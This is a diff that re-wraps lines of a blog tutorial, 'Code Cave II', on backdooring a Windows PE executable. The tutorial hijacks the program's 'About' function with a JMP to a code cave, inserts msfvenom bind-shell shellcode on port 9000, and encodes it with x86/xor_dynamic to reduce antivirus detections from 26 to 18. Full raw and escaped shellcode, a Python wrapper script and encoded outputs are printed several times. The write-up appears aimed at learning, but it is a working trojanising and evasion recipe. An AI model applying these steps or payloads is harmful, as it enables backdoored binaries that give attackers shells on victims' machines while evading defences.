@@ -42,13 +42,15 @@ C:\Users\IEUser\AppData\Local\Programs\Python\Python38-32>
 
 ##### When the fun begins.
 
-As we desire to make the PE File execute shellcode when interacted with in a certain manner, it is required to discover a place to intervene with the flow. For example, if we check the option "About", the program displays the following. 
+As we desire to make the PE File execute shellcode when interacted with in a certain manner, it is required to discover a place to intervene with the flow. For example, if we 
+check the option "About", the program displays the following. 
 
 ![](/assets/img/Code_Cave_II/2.png)
 
 As it is seen, this allows us to gather information of the program and its author. We can use this function to our advantage. Let's investigate this function in Immunity.
 
-In order to find such, the option "Search For > All referenced text strings" will be used. This will search for all text strings that are somehow being used or pushed into the stack.
+In order to find such, the option "Search For > All referenced text strings" will be used. This will search for all text strings that are somehow being used or pushed into the 
+stack.
 
 ![](/assets/img/Code_Cave_II/3.png)
 
@@ -60,7 +62,9 @@ It is gone to the top in order to search for a key phrase, such as for example, 
 
 ![](/assets/img/Code_Cave_II/6.png)
 
-Immunity seems to have given us the desired result. Similarly to the previous blog post, the following step is to replace a specific address that is being executed when the function is processed with a JMP instruction pointing to our code cave. In addition with this, when we finish with our shellcode and aligning the stack, the overwriten address is executed once again and a JMP instruction is placed pointing to the original flow.
+Immunity seems to have given us the desired result. Similarly to the previous blog post, the following step is to replace a specific address that is being executed when the 
+function is processed with a JMP instruction pointing to our code cave. In addition with this, when we finish with our shellcode and aligning the stack, the overwriten address 
+is executed once again and a JMP instruction is placed pointing to the original flow.
 
 In this case, I will replace the PUSH instruction that gives us the information. Moreover, the instructions will be saved so that they are re-assigned later on.
 
@@ -83,11 +87,14 @@ Now, in contemplation of jumping to the code cave without any difficulty,the byt
 
 Similarly to VOL:I of the series, the order of our payload is the following:
 
-+ PUSHAD/PUSHFD instructions. These will save our registers/flags so that they are aligned later on. It is essential for the registers/flags to be aligned so that the instructions work perfectly according to the value of these.
-+ The Shellcode. Shellcode, we are used to it. Some modifications may need to be issued, such as the removal of the last instruction in some cases, as it tends to crash the flow and the modification of a byte which waits for the shellcode to exit for the main program to return its original flow.
++ PUSHAD/PUSHFD instructions. These will save our registers/flags so that they are aligned later on. It is essential for the registers/flags to be aligned so that the 
+instructions work perfectly according to the value of these.
++ The Shellcode. Shellcode, we are used to it. Some modifications may need to be issued, such as the removal of the last instruction in some cases, as it tends to crash the flow 
+and the modification of a byte which waits for the shellcode to exit for the main program to return its original flow.
 + Alignment. The ESP Register must be restored to its old value.
 + POPFD/POPAD. These instructions will restore our registers/flags.
-+ As when assembling the JMP on the entry point instruction some other instructions were replaced, these must be assembled once again so that the code runs as intended and does not crash!
++ As when assembling the JMP on the entry point instruction some other instructions were replaced, these must be assembled once again so that the code runs as intended and does 
+not crash!
 + A JMP instruction pointing towards the following instruction after the replaced ones within the original function. In this case, it will be 0x0040342B.
 
 Remembering this order, the PUSHAD/PUSHFD instructions are assembled.
@@ -105,7 +112,10 @@ root@whitecr0wz:~# msfvenom -p windows/shell_bind_tcp LPORT=9000 -f hex
 No encoder or badchars specified, outputting raw payload
 Payload size: 328 bytes
 Final size of hex file: 656 bytes
-fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a085950e2fd4050405068ea0fdfe0ffd597680200232889e66a10565768c2db3767ffd55768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5
+fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f
+6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a085950e2fd
+4050405068ea0fdfe0ffd597680200232889e66a10565768c2db3767ffd55768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545
+056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5
 root@whitecr0wz:~# 
 ```
 
@@ -121,7 +131,8 @@ DEC ESI is replaced for a NOP, this is done so that it allows the execution to c
 
 ![](/assets/img/Code_Cave_II/16.png)
 
-The final CALL EBP is removed as it would completely demolish the flow. Instead, the stack alignment is placed, which is the same that in the aforementioned post, as the payload is exactly the same.
+The final CALL EBP is removed as it would completely demolish the flow. Instead, the stack alignment is placed, which is the same that in the aforementioned post, as the payload 
+is exactly the same.
 
 ![](/assets/img/Code_Cave_II/17.png)
 
@@ -153,7 +164,8 @@ Although there is big room for improvement, 26 from VOL:I to 18 is a great enhan
 
 ### Encoding
 
-However, things are far from over, as I will not stop to a result of 18, therefore, I thought of a simple method for encoding the entire payload. This consists in copying the entire chunk of instructions (including the PUSHAD/PUSHFD) and encode them with msfvenom. In addition, these are later on assembled once again encoded.
+However, things are far from over, as I will not stop to a result of 18, therefore, I thought of a simple method for encoding the entire payload. This consists in copying the 
+entire chunk of instructions (including the PUSHAD/PUSHFD) and encode them with msfvenom. In addition, these are later on assembled once again encoded.
 
 The steps would be the following:
 
@@ -161,7 +173,9 @@ The steps would be the following:
 + Convert the fromat into hex escape sequences
 + Encode the payload with msfvenom with an encoder such as x86/xor_dynamic, x86/shikata_ga_nai, x86/alpha_mixed, and so forth.
 + Paste the entire set of instructions once again with "Binary Paste".
-+ As encoding will definitely increment the length of the instructions, the final JMP instruction back to the original flow may be seemed altered to an undesired address; therefore, the encoded payload must be decoded, and the JMP must be assembled once again to the desired address, giving a different opcode that will make us encode the payload once again with the correct values.
++ As encoding will definitely increment the length of the instructions, the final JMP instruction back to the original flow may be seemed altered to an undesired address; 
+therefore, the encoded payload must be decoded, and the JMP must be assembled once again to the desired address, giving a different opcode that will make us encode the payload 
+once again with the correct values.
 
 This sounds way harder than it actually is, let's do it!
 
@@ -169,7 +183,9 @@ Copying the entire payload with "Binary Copy".
 
 ![](/assets/img/Code_Cave_II/24.png)
 
-This will copy the instructions to our clipboard in a hex format, similar to msfvenom when providing a payload. However, this is not the one that we need, reason why I used [defuse.ca](https://defuse.ca/online-x86-assembler.htm#disassembly2), that will turn the hex format into the escape sequences as desired for you, just paste them on the "Disassemble" section and process them. You can also perform this task manually, but it may take you a very long time.
+This will copy the instructions to our clipboard in a hex format, similar to msfvenom when providing a payload. However, this is not the one that we need, reason why I used 
+[defuse.ca](https://defuse.ca/online-x86-assembler.htm#disassembly2), that will turn the hex format into the escape sequences as desired for you, just paste them on the 
+"Disassemble" section and process them. You can also perform this task manually, but it may take you a very long time.
 
 Raw payload:
 
@@ -190,10 +206,18 @@ BB 47 13 72 6F 6A 00 53 81 C4 00 02 00 00 9D 61 68 B8 7F 49 00 E9 BA F0 F5 FF
 Payload within escape sequence format:
 
 ```term
-"\x60\x9C\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF2\x52\x57\x8B\x52\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xFF\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x5F\x5F\x5A\x8B\x12\xEB\x8D\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x6A\x08\x59\x50\xE2\xFD\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x68\x02\x00\x23\x28\x89\xE6\x6A\x10\x56\x57\x68\xC2\xDB\x37\x67\xFF\xD5\x57\x68\xB7\xE9\x38\xFF\xFF\xD5\x57\x68\x74\xEC\x3B\xE1\xFF\xD5\x57\x97\x68\x75\x6E\x4D\x61\xFF\xD5\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01\x8D\x44\x24\x10\xC6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56\x56\x53\x56\x68\x79\xCC\x3F\x86\xFF\xD5\x89\xE0\x90\x56\x46\xFF\x30\x68\x08\x87\x1D\x60\xFF\xD5\xBB\xF0\xB5\xA2\x56\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\x81\xC4\x00\x02\x00\x00\x9D\x61\x68\xB8\x7F\x49\x00\xE9\xBA\xF0\xF5\xFF"
+"\x60\x9C\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7
+\xE2\xF2\x52\x57\x8B\x52\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xFF\xAC\xC1\xCF\x0D\x01\xC7\x38\
+xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x5F\x
+5F\x5A\x8B\x12\xEB\x8D\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x6A\x08\x59\x5
+0\xE2\xFD\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x68\x02\x00\x23\x28\x89\xE6\x6A\x10\x56\x57\x68\xC2\xDB\x37\x67\xFF\xD5\x57\x68\xB7\xE9\x38\xFF\xFF\xD5\x57\x68\x74\xEC
+\x3B\xE1\xFF\xD5\x57\x97\x68\x75\x6E\x4D\x61\xFF\xD5\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01\x8D\x44\x24\x10\xC6\x00\
+x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56\x56\x53\x56\x68\x79\xCC\x3F\x86\xFF\xD5\x89\xE0\x90\x56\x46\xFF\x30\x68\x08\x87\x1D\x60\xFF\xD5\xBB\xF0\xB5\xA2\x56\x68\xA6\x95\xBD\x9D\x
+FF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\x81\xC4\x00\x02\x00\x00\x9D\x61\x68\xB8\x7F\x49\x00\xE9\xBA\xF0\xF5\xFF"
 ```
 
-In order to encode the payload, the STDIN function from msfvenom shall be used. So as to achievethis result, a python script will be employed, that may contain a variable with the payload, so that it is then printed into the command-line. Moreover, msfvenom will analyze such data and encode it.
+In order to encode the payload, the STDIN function from msfvenom shall be used. So as to achievethis result, a python script will be employed, that may contain a variable with 
+the payload, so that it is then printed into the command-line. Moreover, msfvenom will analyze such data and encode it.
 
 Python script:
 
@@ -202,7 +226,14 @@ root@whitecr0wz:~# cat custom.py
 
 shellcode = (
 
-"\x60\x9C\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF2\x52\x57\x8B\x52\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xFF\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x5F\x5F\x5A\x8B\x12\xEB\x8D\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x6A\x08\x59\x50\xE2\xFD\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x68\x02\x00\x23\x28\x89\xE6\x6A\x10\x56\x57\x68\xC2\xDB\x37\x67\xFF\xD5\x57\x68\xB7\xE9\x38\xFF\xFF\xD5\x57\x68\x74\xEC\x3B\xE1\xFF\xD5\x57\x97\x68\x75\x6E\x4D\x61\xFF\xD5\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01\x8D\x44\x24\x10\xC6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56\x56\x53\x56\x68\x79\xCC\x3F\x86\xFF\xD5\x89\xE0\x90\x56\x46\xFF\x30\x68\x08\x87\x1D\x60\xFF\xD5\xBB\xF0\xB5\xA2\x56\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\x81\xC4\x00\x02\x00\x00\x9D\x61\x68\xB8\x7F\x49\x00\xE9\xBA\xF0\xF5\xFF"
+"\x60\x9C\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7
+\xE2\xF2\x52\x57\x8B\x52\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xFF\xAC\xC1\xCF\x0D\x01\xC7\x38\
+xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x5F\x
+5F\x5A\x8B\x12\xEB\x8D\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x6A\x08\x59\x5
+0\xE2\xFD\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x68\x02\x00\x23\x28\x89\xE6\x6A\x10\x56\x57\x68\xC2\xDB\x37\x67\xFF\xD5\x57\x68\xB7\xE9\x38\xFF\xFF\xD5\x57\x68\x74\xEC
+\x3B\xE1\xFF\xD5\x57\x97\x68\x75\x6E\x4D\x61\xFF\xD5\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01\x8D\x44\x24\x10\xC6\x00\
+x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56\x56\x53\x56\x68\x79\xCC\x3F\x86\xFF\xD5\x89\xE0\x90\x56\x46\xFF\x30\x68\x08\x87\x1D\x60\xFF\xD5\xBB\xF0\xB5\xA2\x56\x68\xA6\x95\xBD\x9D\x
+FF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\x81\xC4\x00\x02\x00\x00\x9D\x61\x68\xB8\x7F\x49\x00\xE9\xBA\xF0\xF5\xFF"
 
 )
 
@@ -222,7 +253,11 @@ x86/xor_dynamic chosen with final size 393
 Successfully added NOP sled of size 5 from x86/single_byte
 Payload size: 398 bytes
 Final size of hex file: 796 bytes
-27f52ff83feb235b89dfb06ffcae75fd89f989de8a0630074766813f0641740846803e6f75eeebeaffe1e8d8ffffff276f47bbdbcfa527272747aec216e743ac7717ac752bac7533ac550f28906d0116d88b1b465b250b07e6e82a26e0c5d57570ac7537ac6d1bac6b365fc46f26f676ac7e0726f4ac6e3fc41d6eac13ac26f116d88be6e82a26e01fc752d1245adf1c5a0352c37fac7f0326f441ac2b6cac7f3b26f4ac23ac26f7ae6303037c7c467e7d76d8c778787dac35ccaa7a4f141527274f50541578734f6b500120d8f29fb72627270ee373774f0ea74c27d8f24d2f7e77c5da677767774fcd28f8c7d8f2b04f2527040faec14d3771704fe5fc1040d8f2704f90ce1fd8d8f2704f53cb1cc6d8f270b04f52496a46d8f24f444a4327aec470707016d14d357e71c5da41e063031b2626aa630337e127637377717171617169717174714f5eeb18a1d8f2aec7b77161d8174f2fa03a47d8f29cd79285714f81b29abad8f21b215b2da7dcc752229c603455484d2774a6e327252727ba464f9f586e27ce9dd7d2d82d0641
+27f52ff83feb235b89dfb06ffcae75fd89f989de8a0630074766813f0641740846803e6f75eeebeaffe1e8d8ffffff276f47bbdbcfa527272747aec216e743ac7717ac752bac7533ac550f28906d0116d88b1b465b250b07e
+6e82a26e0c5d57570ac7537ac6d1bac6b365fc46f26f676ac7e0726f4ac6e3fc41d6eac13ac26f116d88be6e82a26e01fc752d1245adf1c5a0352c37fac7f0326f441ac2b6cac7f3b26f4ac23ac26f7ae6303037c7c467e7d
+76d8c778787dac35ccaa7a4f141527274f50541578734f6b500120d8f29fb72627270ee373774f0ea74c27d8f24d2f7e77c5da677767774fcd28f8c7d8f2b04f2527040faec14d3771704fe5fc1040d8f2704f90ce1fd8d8f
+2704f53cb1cc6d8f270b04f52496a46d8f24f444a4327aec470707016d14d357e71c5da41e063031b2626aa630337e127637377717171617169717174714f5eeb18a1d8f2aec7b77161d8174f2fa03a47d8f29cd79285714f
+81b29abad8f21b215b2da7dcc752229c603455484d2774a6e327252727ba464f9f586e27ce9dd7d2d82d0641
 root@whitecr0wz:~# 
 ```
 
@@ -236,7 +271,8 @@ The encoded payload is pasted with "Binary paste".
 
 ![](/assets/img/Code_Cave_II/26.png)
 
-When the function is not loaded, the shellcode remains encoded. Nevertheless, when interacted with, it will decode itself. As it is required to modify the last instruction, it will be interacted with.
+When the function is not loaded, the shellcode remains encoded. Nevertheless, when interacted with, it will decode itself. As it is required to modify the last instruction, it 
+will be interacted with.
 
 Last section of the payload before decoding.
 
@@ -246,7 +282,8 @@ After decoding.
 
 ![](/assets/img/Code_Cave_II/28.png)
 
-Interesting, our JMP no longer points to 0040342B. Instead, it directs the flow to 0040345C. With this configuration, our backdoor will never work properly! Let's make some modifications.
+Interesting, our JMP no longer points to 0040342B. Instead, it directs the flow to 0040345C. With this configuration, our backdoor will never work properly! Let's make some 
+modifications.
 
 ![](/assets/img/Code_Cave_II/29.png)
 
@@ -259,7 +296,14 @@ root@whitecr0wz:~# cat custom.py
 
 shellcode = (
 
-"\x60\x9C\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF2\x52\x57\x8B\x52\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xFF\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x5F\x5F\x5A\x8B\x12\xEB\x8D\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x6A\x08\x59\x50\xE2\xFD\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x68\x02\x00\x23\x28\x89\xE6\x6A\x10\x56\x57\x68\xC2\xDB\x37\x67\xFF\xD5\x57\x68\xB7\xE9\x38\xFF\xFF\xD5\x57\x68\x74\xEC\x3B\xE1\xFF\xD5\x57\x97\x68\x75\x6E\x4D\x61\xFF\xD5\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01\x8D\x44\x24\x10\xC6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56\x56\x53\x56\x68\x79\xCC\x3F\x86\xFF\xD5\x89\xE0\x90\x56\x46\xFF\x30\x68\x08\x87\x1D\x60\xFF\xD5\xBB\xF0\xB5\xA2\x56\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\x81\xC4\x00\x02\x00\x00\x9D\x61\x68\xB8\x7F\x49\x00\xE9\x89\xF0\xF5\xFF"
+"\x60\x9C\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7
+\xE2\xF2\x52\x57\x8B\x52\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xFF\xAC\xC1\xCF\x0D\x01\xC7\x38\
+xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x5F\x
+5F\x5A\x8B\x12\xEB\x8D\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x6A\x08\x59\x5
+0\xE2\xFD\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x68\x02\x00\x23\x28\x89\xE6\x6A\x10\x56\x57\x68\xC2\xDB\x37\x67\xFF\xD5\x57\x68\xB7\xE9\x38\xFF\xFF\xD5\x57\x68\x74\xEC
+\x3B\xE1\xFF\xD5\x57\x97\x68\x75\x6E\x4D\x61\xFF\xD5\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01\x8D\x44\x24\x10\xC6\x00\
+x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56\x56\x53\x56\x68\x79\xCC\x3F\x86\xFF\xD5\x89\xE0\x90\x56\x46\xFF\x30\x68\x08\x87\x1D\x60\xFF\xD5\xBB\xF0\xB5\xA2\x56\x68\xA6\x95\xBD\x9D\x
+FF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\x81\xC4\x00\x02\x00\x00\x9D\x61\x68\xB8\x7F\x49\x00\xE9\x89\xF0\xF5\xFF"
 
 )
 
@@ -279,7 +323,11 @@ x86/xor_dynamic chosen with final size 393
 Successfully added NOP sled of size 5 from x86/single_byte
 Payload size: 398 bytes
 Final size of hex file: 796 bytes
-f5982f933feb235b89dfb052fcae75fd89f989de8a0630074766813f723c740846803e5275eeebeaffe1e8d8ffffff275247bbdbcfa527272747aec216e743ac7717ac752bac7533ac550f28906d0116d88b1b465b250b07e6e82a26e0c5d57570ac7537ac6d1bac6b365fc46f26f676ac7e0726f4ac6e3fc41d6eac13ac26f116d88be6e82a26e01fc752d1245adf1c5a0352c37fac7f0326f441ac2b6cac7f3b26f4ac23ac26f7ae6303037c7c467e7d76d8c778787dac35ccaa7a4f141527274f50541578734f6b500120d8f29fb72627270ee373774f0ea74c27d8f24d2f7e77c5da677767774fcd28f8c7d8f2b04f2527040faec14d3771704fe5fc1040d8f2704f90ce1fd8d8f2704f53cb1cc6d8f270b04f52496a46d8f24f444a4327aec470707016d14d357e71c5da41e063031b2626aa630337e127637377717171617169717174714f5eeb18a1d8f2aec7b77161d8174f2fa03a47d8f29cd79285714f81b29abad8f21b215b2da7dcc752229c603455484d2774a6e327252727ba464f9f586e27ceaed7d2d82d723c
+f5982f933feb235b89dfb052fcae75fd89f989de8a0630074766813f723c740846803e5275eeebeaffe1e8d8ffffff275247bbdbcfa527272747aec216e743ac7717ac752bac7533ac550f28906d0116d88b1b465b250b07e
+6e82a26e0c5d57570ac7537ac6d1bac6b365fc46f26f676ac7e0726f4ac6e3fc41d6eac13ac26f116d88be6e82a26e01fc752d1245adf1c5a0352c37fac7f0326f441ac2b6cac7f3b26f4ac23ac26f7ae6303037c7c467e7d
+76d8c778787dac35ccaa7a4f141527274f50541578734f6b500120d8f29fb72627270ee373774f0ea74c27d8f24d2f7e77c5da677767774fcd28f8c7d8f2b04f2527040faec14d3771704fe5fc1040d8f2704f90ce1fd8d8f
+2704f53cb1cc6d8f270b04f52496a46d8f24f444a4327aec470707016d14d357e71c5da41e063031b2626aa630337e127637377717171617169717174714f5eeb18a1d8f2aec7b77161d8174f2fa03a47d8f29cd79285714f
+81b29abad8f21b215b2da7dcc752229c603455484d2774a6e327252727ba464f9f586e27ceaed7d2d82d723c
 root@whitecr0wz:~# 
 ```
 
